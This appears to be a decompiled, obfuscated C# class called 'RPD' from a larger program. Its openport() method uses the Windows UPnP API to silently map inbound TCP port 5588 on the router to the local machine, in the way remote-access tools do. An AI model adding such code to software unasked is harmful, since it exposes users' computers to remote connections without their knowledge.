using System.Net;
using Microsoft.VisualBasic.CompilerServices;
using NATUPNPLib;

public class RPD
{
	public RPD()
	{
		Class13.eamVqU3zSE23Z();
		base._002Ector();
	}

	public void openport()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		string text = hostEntry.AddressList.GetValue(0)!.ToString();
		UPnPNAT val = (UPnPNAT)new UPnPNATClass();
		IStaticPortMappingCollection staticPortMappingCollection = ((IUPnPNAT)val).get_StaticPortMappingCollection();
		staticPortMappingCollection.Add(Conversions.ToInteger("5588"), "TCP", Conversions.ToInteger("5588"), text, true, "Description");
	}
}
